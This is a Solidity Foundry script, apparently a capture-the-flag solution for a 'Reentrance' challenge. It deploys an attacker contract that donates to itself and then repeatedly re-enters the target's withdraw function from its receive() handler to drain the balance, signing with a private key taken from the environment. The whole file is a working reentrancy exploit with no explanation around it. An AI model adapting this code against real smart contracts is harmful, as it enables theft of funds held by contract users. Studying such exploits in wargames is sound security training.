// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackReentrant {

    IReentrance public reentranceInstance =
        IReentrance(0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944);

    constructor() payable {
        // Donate to ourselves
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function attack() external {
        reentranceInstance.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(reentranceInstance).balance >= 0.001 ether) {
            reentranceInstance.withdraw(0.001 ether);
        }
    }
}


contract ReentrancySolution is Script {

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackReentrant attacker =
            new AttackReentrant{value: 0.001 ether}();

        attacker.attack();

        vm.stopBroadcast();
    }
}
